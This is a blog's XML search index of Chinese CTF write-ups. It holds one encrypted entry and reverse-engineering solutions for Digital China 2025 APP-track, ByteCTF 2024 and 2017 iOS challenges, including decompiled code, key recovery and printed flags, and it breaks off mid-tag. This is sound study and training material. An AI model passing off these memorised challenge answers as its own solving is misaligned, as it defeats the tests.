<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>defconctf2025_qualifier</title>
    <link href="/2025/04/21/defconctf2025-qualifier/"/>
    <url>/2025/04/21/defconctf2025-qualifier/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="a0eeab07c55acc9874a67c08e8bf941d19d08212c5dd4348a3bd8ec38cff532e">7506edb3ceb0437d6c59fbae4fc5c0ab5878b9540d5a6086255126cd7577cca5e4620f05da7d5bf643977bcdd5616fb14aa4030e035c7d3d74e74490fc7dc1d45f63e532e2e902b9f7a07fae7bfd21cd5cba2b2ec6207d4e7dbfa25fb6676c8119bbdf62069bcb912ab74ac2905e1f7b27a84c4805f0970c637f9c422cdb88d5095e20711e40e91f5a05d79b62ddf7df4c5c276e71815de021c2a85de93323806d91717aca8fd4807b90161727ecc825ed4006b375698fee940e26154e4358d233a3b73176c3cfe9b145890a322a498c1bd20a8698b8d825ece6769c6736ba0a5641aae151e2deaf8499ba00d070b40cd07fcf163a920f47539565793e186c4ff74700ccfacf1489ba0c394693d0480b933b8e866c134a96a17f5924e9955d155c5c93c5c06cf11d67d482470ed2d76333ad467433c153835731f2a9ab482540d51eca9803e07ef010dd22fb3619baac3b489a9690b115af773ec1461d8022bea4fa3aad4fa72e3091d8568aa02b3839b764a30aea490045daf2ed291659da3cc3afb4dda01922bba770c0bb30dfdf4e571129ff435b5abc0a7d607ed984c57806cb8351bfeef0fd10c7844aaaa0d900e4395173fbcedc865b56c065133bcca2e6fbf3fa25f0848aabebe7db6151d240ce6e3ead6ca37f1e9b34fd5b4676b46ce42637ce5e8d2f568e371246639af95aa9a92f66295d322488129f6f578a9863a4325444f0c00dc36e8acf2897efccdd4e4876be63e53cf17b5b6a6df5a98daf91d43e28f296083085adf1d5644ef20da3d1ec619f523f463dc6737de50da08ddb09ca59fd099aed1dbc62603e7326640c4ed997bf5ab58be5b276a72e1bbfd33cf5a2f611eda3663fe14a4ca74a5a5738dd56c53da141c8c4f52cbec67d6b72e68194de2bfbb0793e6882b4cbd8b72c940d9c5fce85ad639e1ed23c6672b50353a4638df2ef5b677d144d827d8c4835f9380d7cf62c711f8f4c3f352832076ba1851510fba0597ced1cdbfc982f969afaa6b26ca1baf0072dfc2c3400aebfe5269fb3c6a5f0350570f6b16bac48533366758f5f08baf70804aef912de72530d8f3da52434936bf8e8cb973b8020ca9c851e90026d978cd554265b8201836183341fd7cbb4f1634f5c75fb7c1ea6c6eb4c9c9f95b9ff7560649c84f85222d39d93eb85687c4b1b0181c577653e05d789f13de78a2545b3afda7091d7e8c5048c33bfe0fd5ee566c9126499e8d8ed6f9b98ddd3df54b3d9785cd74679a922e54c62583bb30a95b3dccdbe0c1373a59feb46787717979fd4e2af749b6b8ca5e39662b6c2136c1641617e84631d45d555e2c50c093c771eb1ae27553d2ae4562ac71fa80ccb714a4e05c1717bcf296e7bcf8b29923cb0724a07e1bbebd7db77a3fb8efac5ac211bbca2bdcee59b478828252f7c9ce34fa381ef6f827609548b6db001f77a3d575569453e267808c0721beadf3089f53224990eb9f4d36246e628c6566a042ac54686798a374167027da7aad90a209b71d92ff4d9a57e9a2586b8cc5c4b3c1f3ed8a98de708dbcb9874aad2050a911e75e3a4b6d5d454929a7e2796920d055ce8539da9c669aed330f33172d8f724bd76466878d03e31991ff6ab7ac8e07072ac4b0694080a9caeb54a0a7bd617c7a2715d0c7ad5e83b37fd723a5886f5851c0d6febe0631ab66975de83b72987aff77e9875da6b2c9d6f04846030d55769e77d05445de82abe5a36af2a6621f157adb8b0faf743fe9838b437d3f6882e47d62d88c503d7bc0507f2ac3ed661300cb5afd73c4ee71b4f2dba68688cd020fd8f9dd17b6a5e98d41a31e0a66d3f3f534d1b4feec261617b0d6281b2b93b4d3b0f477e8c880abb14eb0f173b568a941800843fd999082d4ff3562744030a2c72040c5543af168e2d2fa705ebf36597bb9fe413a5f918d92141c92e4067253d31b357fddf2e43716ab75ca57bf8d3a3d22e9469251a0d2d7bfedecec6e508bd260a738c60e43afd5a8ca5f6084b6e6ed18d31ff5b0bebe4fd14307e2774f7eef7409b54660045bc256e0cf49d9ec3a80df3797c7567dd426d79c29f873dd18698785fecb50d862590a70ad94e5141f1a6407a13ea7b3cefc484e8ba463da024614c510e0e6794a19f4413b85da4264e145f9070ae3e54f42a09ff6bb8e1cdedf3f64267d164e8c3344762f7397ac63cbdde3fea09f8175a92126c655c7cd30c2c9790a0b6b1aea8087b6ec7cd69da952090cddb3ded070d9527dbec074ae5049f65c05fa9a5127a7c36a7e10c75a50ffad9f55460e84930547d6e8310c5f35c661dd22c22e8f0a1ebca9687e815ddd4259f576d9b46618fb9db40024f55203b9c71286a5ac6a7642767bb9f68d9d9855785113173927ebe770758cb226364fb56751e5234c42f9f215f4720df491f3b43723d03dede6d675a6c91b4f73e626eb107ae66a8f8218592010941e1e41052880be88379a985060a5f0b472528f31a17a26df96f35513add7dc8e16620d48fcccd435d7952f6da73f5e9ce998c85410b22d8626ee71ee1772bcddeb7da19cdebd4364bb76cf27631ac74bb8e2f551fda6c1572039747020555dce8824eb767a675b47628f8d9b65a465011b8c0fef6726cc33d4b8757c5e070cc01c27630b50dab4e43a8efa506b885c1ed31d0df10dd903d3f1a212b4ee57a22237de71a28053a507d3cfea69be2ce4ddd43425e679f691acf8bd5942ee40197d65afe</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>比赛wp</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2025数字中国APP赛道安全积分争夺赛决赛部分wp</title>
    <link href="/2025/04/19/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/"/>
    <url>/2025/04/19/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/</url>
    
    <content type="html"><![CDATA[<h1 id="数据加密"><a href="#数据加密" class="headerlink" title="数据加密"></a>数据加密</h1><h2 id="crackme"><a href="#crackme" class="headerlink" title="crackme"></a>crackme</h2><p>找到关键函数，因为不知道CCCrypt(0, 0, 1u对应什么算法，得到正确的key和iv后尝试解密</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs prolog"><span class="hljs-symbol">__int64</span> <span class="hljs-symbol">__fastcall</span> verify_system_password(const void *a1)<br>&#123;<br>  <span class="hljs-symbol">_BYTE</span> v2[<span class="hljs-number">4</span>]; // [xsp+<span class="hljs-number">20</span>h] [xbp<span class="hljs-number">-90</span>h] <span class="hljs-symbol">BYREF</span><br>  <span class="hljs-symbol">__int64</span> *v3; // [xsp+<span class="hljs-number">28</span>h] [xbp<span class="hljs-number">-88</span>h]<br>  <span class="hljs-symbol">_BYTE</span> *dataOut; // [xsp+<span class="hljs-number">30</span>h] [xbp<span class="hljs-number">-80</span>h]<br>  int v5; // [xsp+<span class="hljs-number">3</span><span class="hljs-symbol">Ch</span>] [xbp<span class="hljs-number">-74</span>h]<br>  int i; // [xsp+<span class="hljs-number">44</span>h] [xbp<span class="hljs-number">-6</span><span class="hljs-symbol">Ch</span>]<br>  const char *v8; // [xsp+<span class="hljs-number">48</span>h] [xbp<span class="hljs-number">-68</span>h]<br>  size_t dataOutMoved[<span class="hljs-number">3</span>]; // [xsp+<span class="hljs-number">50</span>h] [xbp<span class="hljs-number">-60</span>h] <span class="hljs-symbol">BYREF</span><br>  size_t dataOutAvailable; // [xsp+<span class="hljs-number">68</span>h] [xbp<span class="hljs-number">-48</span>h]<br>  size_t v11; // [xsp+<span class="hljs-number">70</span>h] [xbp<span class="hljs-number">-40</span>h]<br>  const void *v12; // [xsp+<span class="hljs-number">78</span>h] [xbp<span class="hljs-number">-38</span>h]<br>  unsigned int v13; // [xsp+<span class="hljs-number">84</span>h] [xbp<span class="hljs-number">-2</span><span class="hljs-symbol">Ch</span>]<br>  char iv[<span class="hljs-number">16</span>]; // [xsp+<span class="hljs-number">88</span>h] [xbp<span class="hljs-number">-28</span>h] <span class="hljs-symbol">BYREF</span><br>  char key[<span class="hljs-number">16</span>]; // [xsp+<span class="hljs-number">98</span>h] [xbp<span class="hljs-number">-18</span>h] <span class="hljs-symbol">BYREF</span><br><br>  v3 = &amp;qword_1000140B0;<br>  v12 = a1;<br>  ++qword_1000140B0;<br>  v11 = strlen((const char *)a1);<br>  dataOutAvailable = (v11 + <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFF0</span><span class="hljs-symbol">LL</span>;<br>  dataOutMoved[<span class="hljs-number">2</span>] = (size_t)v2;<br>  dataOut = &amp;v2[-((dataOutAvailable + <span class="hljs-number">15</span>) &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFF0</span><span class="hljs-symbol">LL</span>)];<br>  dataOutMoved[<span class="hljs-number">1</span>] = dataOutAvailable;<br>  dataOutMoved[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span><span class="hljs-symbol">LL</span>;<br>  v8 = <span class="hljs-string">&quot;1234561234561234&quot;</span>;<br>  for ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; ++i )<br>  &#123;<br>    ++v3[<span class="hljs-number">1</span>];<br>    key[i] = encrypted_system_key[i] ^ v8[i];<br>    iv[i] = encrypted_system_iv[i] ^ v8[i];<br>  &#125;<br>  print_crypto_info();<br>  if ( <span class="hljs-symbol">CCCrypt</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>u, key, <span class="hljs-number">0x10</span>uLL, iv, v12, v11, dataOut, dataOutAvailable, dataOutMoved) )<br>  &#123;<br>    ++v3[<span class="hljs-number">2</span>];<br>    v13 = <span class="hljs-number">0</span>;<br>    v5 = <span class="hljs-number">1</span>;<br>  &#125;<br>  else<br>  &#123;<br>    if ( dataOutMoved[<span class="hljs-number">0</span>] == <span class="hljs-number">16</span> )<br>    &#123;<br>      <span class="hljs-symbol">LOBYTE</span>(v13) = memcmp(dataOut, &amp;encrypted_system_password, <span class="hljs-number">0x10</span>uLL) == <span class="hljs-number">0</span>;<br>      v13 = (unsigned <span class="hljs-symbol">__int8</span>)v13;<br>    &#125;<br>    else<br>    &#123;<br>      ++v3[<span class="hljs-number">3</span>];<br>      v13 = <span class="hljs-number">0</span>;<br>    &#125;<br>    v5 = <span class="hljs-number">1</span>;<br>  &#125;<br>  return v13;<br>&#125;<br></code></pre></td></tr></table></figure><img src="/2025/04/19/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20250419164339691.png" class="" title="image-20250419164339691"><h1 id="隐私合规"><a href="#隐私合规" class="headerlink" title="隐私合规"></a>隐私合规</h1><h2 id="TaskPrivate-1"><a href="#TaskPrivate-1" class="headerlink" title="TaskPrivate(1)"></a>TaskPrivate(1)</h2><p><strong>发现des和base64</strong></p><img src="/2025/04/19/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/wps1.jpg" class="" title="img"> <p><strong>只找到了key，猜测key和iv是一样的</strong></p><p><strong>密文先from hex再解base64，最后des解密</strong></p><p>**MD5{银行卡+密码}**<strong>后提交</strong></p><img src="/2025/04/19/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/wps2.jpg" class="" title="img"> <h2 id="TaskPrivate-2"><a href="#TaskPrivate-2" class="headerlink" title="TaskPrivate(2)"></a>TaskPrivate(2)</h2><p><strong>MainActivity里找到申请读取短信和打电话的权限</strong> </p><img src="/2025/04/19/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/wps3.jpg" class="" title="img"> <img src="/2025/04/19/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/wps4.jpg" class="" title="img"> <p><strong>md5后得到flag</strong> </p><img src="/2025/04/19/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/wps5.jpg" class="" title="img">]]></content>
    
    
    <categories>
      
      <category>比赛wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>app逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ios逆向整理</title>
    <link href="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/"/>
    <url>/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p>参考链接：<a href="https://xz.aliyun.com/news/15176">https://xz.aliyun.com/news/15176</a></p><p><a href="https://xz.aliyun.com/news/15176">https://dwj1210.github.io/2018/05/21/%E4%B8%80%E6%AC%A1%20iOS%20CTF%20%E5%AE%9E%E6%88%98%20WriteUp/</a></p><p>国内ctf比赛中很少出现ios的题目，找了很久一共就找到下面三道</p><h1 id="一般思路"><a href="#一般思路" class="headerlink" title="一般思路"></a>一般思路</h1><p>将ipa文件后缀改为zip，解压之后进入Payload，会有一个.app文件夹，进去找到二进制文件就能放到ida里分析</p><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744294933785-b2897347-4161-459b-84b0-a1cd9575dcfa.png" class="" title="img"><p>main函数似乎都没什么用</p><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744336582681-d78c4a83-b2df-409d-83ac-074c40b86d3f.png" class="" title="img"><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744336590527-eb056655-0d64-4248-80f4-e0966cee62ef.png" class="" title="img"><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744336623761-6a6de096-6ea6-4290-84f3-6ac1cf4719a0.png" class="" title="img"><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744352329292-07623eae-be23-4fa8-9bf8-6bf22254ce50.png" class="" title="img"><p>一般都是直接搜字符串然后交叉引用找到关键函数继续分析</p><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="2025数字中国app赛道IOSApp"><a href="#2025数字中国app赛道IOSApp" class="headerlink" title="2025数字中国app赛道IOSApp"></a>2025数字中国app赛道IOSApp</h2><p>题目描述：安全审计员审查发现revealFlag函数比较可疑，请分析代码，帮她找到与之相关的flag</p><p>搜索string找到一个拼接base64</p><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744293487229-38a07e64-2089-4b80-9384-7c00353b839e.png" class="" title="img"><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744293465827-c36d1257-7dc3-4564-821b-6d3894d566ba.png" class="" title="img"><p>swift就是用cpp写的，所以看上去很像cpp的风格</p><p>调用obfuscatedFlag.unsafeMutableAddressor()，表示从 obfuscatedFlag 获取 flag 的密文</p><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744353363244-3b0dd580-2d08-4dfd-b0dd-67935d5089f8.png" class="" title="img"><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744353378259-9a04b0ef-1bd4-4a5a-9ba8-7db0518379da.png" class="" title="img"><p>Collection.map<A>(_:)(closure #1 in revealFlag(if:), …)表示对 String 类型调用 map，对每一个加密字符应用了解密函数（revealFlag）</p><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744335517298-457f947a-e152-42d1-b0ca-9cf7048b40cf.png" class="" title="img"><p>进入解密函数，Character.asciiValue.getter(); 表示获取字符的 ascii 值</p><p>result &#x3D; UnsignedInteger&lt;&gt;.init<A>(_:)(&amp;v15, …);可能会让传入的 v15 的一部分（在内存中紧邻的数据）写入了 v16 的值，而v15等于1，也就是每个字符的ascii值都减一</p><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744336230391-84ba390a-4ec0-4496-89ac-062df5176de4.png" class="" title="img"><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744353426302-2487cda3-ed12-400d-aa07-e87a4ff7b634.png" class="" title="img"><h2 id="2024ByteCTF极限逃脱"><a href="#2024ByteCTF极限逃脱" class="headerlink" title="2024ByteCTF极限逃脱"></a>2024ByteCTF极限逃脱</h2><p>010查看格式，修改后缀后解压，直接搜索字符串发现flag格式</p><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1727833033895-972bc39d-5746-456f-9f6a-8e66fdeb93a1.png" class="" title="img"><p>后面有uuid的字符串，直接交不对，且上面有a-f，猜测是某种映射</p><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1727832979869-ec0b2e4a-061b-4617-b640-a1b4923cb475.png" class="" title="img"><p>字符串交叉引用找到关键函数，下面分析整个函数</p><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1727832913856-8be73c26-133a-45e1-817b-2f66e3c9b992.png" class="" title="img"><p>self相当于从内存加载，而输入的直接是最后的flag</p><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744353086384-4774bfe5-8270-4bca-9dfd-75e94012c6d5.png" class="" title="img"><p>{a67be199da4b-b092-bd3e-e777-a67be199da4b} sha256加密后得到6c9838a3c6810bdb2633ed5910b8547c09a7a4c08bf69ae3a95c5c37f9e8f57e</p><p>取子串，第一个变量是源字符串，第二个变量无法查找，第三个变量猜测是下标，第四个变量是长度</p><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744337418837-6389aab5-2fd8-439c-a5cb-520797dbe2b8.png" class="" title="img"><p>各取一段替换后作为flag一部分</p><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1727836470277-64459f21-ac4e-4aee-b25e-459eb13c2f78.png" class="" title="img"><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ByteCTF</span>&#123;c9838b3c-<span class="hljs-number">6810</span>-<span class="hljs-number">8</span>a3d-<span class="hljs-number">8</span>a3c-<span class="hljs-number">8</span>a3c6810bdb2&#125;<br></code></pre></td></tr></table></figure><h2 id="2017iOS-CTF"><a href="#2017iOS-CTF" class="headerlink" title="2017iOS CTF"></a>2017iOS CTF</h2><p>根据string两次交叉引用找到关键函数</p><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744355432747-2631d95a-378e-47e6-b573-3bffb6bae9ee.png" class="" title="img"><p>self-&gt;password是输入，长度为32，与self-&gt;plain相比，相等且self-&gt;fg为0则missed</p><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744355396688-ccbc4c43-6d06-4e53-bc8f-eb18096f99f0.png" class="" title="img"><p>self-&gt;plain要从 ViewController  类里的-init 或 -viewDidLoad 等初始化函数中找</p><p>self-&gt;plain 从 secret.txt 中读取并base64解密</p><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744355726169-04564607-c99d-424b-909a-5195bc70cf7e.png" class="" title="img"><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744355824502-bd2c0e90-c004-4894-a2ad-9394d721129b.png" class="" title="img"><p>输入和pd前16位相等</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs c">  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)objc_msgSend(v10, <span class="hljs-string">&quot;isEqualToString:&quot;</span>, v12) )<br>  &#123;<br>    fg = self-&gt;fg;<br>    objc_release(v12);<br>    objc_release(v10);<br>    <span class="hljs-keyword">if</span> ( !fg )<br>    &#123;<br>      v14 = objc_msgSend(&amp;OBJC_CLASS_$_UIAlertView, <span class="hljs-string">&quot;alloc&quot;</span>);<br>      v15 = objc_msgSend(<br>              v14,<br>              <span class="hljs-string">&quot;initWithTitle:message:delegate:cancelButtonTitle:otherButtonTitles:&quot;</span>,<br>              CFSTR(<span class="hljs-string">&quot;Wrong~&quot;</span>),<br>              CFSTR(<span class="hljs-string">&quot;Sorry, you missed the flag!&quot;</span>),<br>              <span class="hljs-number">0LL</span>,<br>              CFSTR(<span class="hljs-string">&quot;Ok&quot;</span>),<br>              <span class="hljs-number">0LL</span>);<br>      objc_msgSend(v15, <span class="hljs-string">&quot;show&quot;</span>);<br>      v16 = v15;<br>LABEL_14:<br>      objc_release(v16);<br>      <span class="hljs-keyword">goto</span> LABEL_15;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    objc_release(v12);<br>    objc_release(v10);<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( self-&gt;fg )<br>  &#123;<br>    NSLog(&amp;stru_10000C488.isa, self-&gt;pd);<br>    v17 = <span class="hljs-number">0LL</span>;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      v18 = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)objc_msgSend(v8, <span class="hljs-string">&quot;characterAtIndex:&quot;</span>, v17);<br>      <span class="hljs-keyword">if</span> ( v18 != (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)objc_msgSend(self-&gt;pd, <span class="hljs-string">&quot;characterAtIndex:&quot;</span>, v17) )<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">if</span> ( ++v17 &gt;= <span class="hljs-number">16</span> )<br>      &#123;<br>        v19 = <span class="hljs-number">16LL</span>;<br>        <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>        &#123;<br>          v20 = (<span class="hljs-type">unsigned</span> __int8)objc_msgSend(v8, <span class="hljs-string">&quot;characterAtIndex:&quot;</span>, v19);<br>          v21 = (<span class="hljs-type">unsigned</span> __int8)((<span class="hljs-type">unsigned</span> __int8)objc_msgSend(self-&gt;pd, <span class="hljs-string">&quot;characterAtIndex:&quot;</span>, v19) ^ v20) + <span class="hljs-number">5</span>;<br>          v22 = v19 - <span class="hljs-number">16</span>;<br>          v23 = objc_msgSend(self-&gt;key, <span class="hljs-string">&quot;objectAtIndex:&quot;</span>, v22);<br>          v24 = objc_retainAutoreleasedReturnValue(v23);<br>          v25 = (<span class="hljs-type">unsigned</span> __int8)objc_msgSend(v24, <span class="hljs-string">&quot;intValue&quot;</span>);<br>          objc_release(v24);<br>          <span class="hljs-keyword">if</span> ( v21 != v25 )<br>            <span class="hljs-keyword">goto</span> LABEL_15;<br>          v19 = v22 + <span class="hljs-number">17</span>;<br>          <span class="hljs-keyword">if</span> ( v19 &gt; <span class="hljs-number">31</span> )<br>          &#123;<br>            v26 = objc_msgSend(&amp;OBJC_CLASS_$_NSString, <span class="hljs-string">&quot;stringWithFormat:&quot;</span>, CFSTR(<span class="hljs-string">&quot;flag&#123;%@&#125;&quot;</span>), v8);<br>            v27 = objc_retainAutoreleasedReturnValue(v26);<br>            v28 = objc_msgSend(&amp;OBJC_CLASS_$_UIAlertView, <span class="hljs-string">&quot;alloc&quot;</span>);<br>            v29 = objc_msgSend(<br>                    v28,<br>                    <span class="hljs-string">&quot;initWithTitle:message:delegate:cancelButtonTitle:otherButtonTitles:&quot;</span>,<br>                    CFSTR(<span class="hljs-string">&quot;Congratulation!&quot;</span>),<br>                    v27,<br>                    <span class="hljs-number">0LL</span>,<br>                    CFSTR(<span class="hljs-string">&quot;Ok&quot;</span>),<br>                    <span class="hljs-number">0LL</span>);<br>            objc_msgSend(v29, <span class="hljs-string">&quot;show&quot;</span>);<br>            objc_release(v29);<br>            v16 = (UIAlertView *)v27;<br>            <span class="hljs-keyword">goto</span> LABEL_14;<br>          &#125;<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><p>要想使得self-&gt;fg为1，在viewDidLoad中self-&gt;pd只能等于2333333333333，可是pd本身都没有16位</p><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744356634704-9a75a39e-14b6-4335-ba84-8dd981e3cb64.png" class="" title="img"><p>pd由generate生成</p><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744359093325-e5e1a3fc-527a-471d-a533-248e647e447b.png" class="" title="img"><p>由generate方法决定比较的字符串</p><img src="/2025/04/11/ios%E9%80%86%E5%90%91%E6%95%B4%E7%90%86/1744359115517-85dcfe81-c115-4c5b-abbe-f70c435f1a85.png" class="" title="img"><p>deb里的lib文件hook了generate方法</p><img 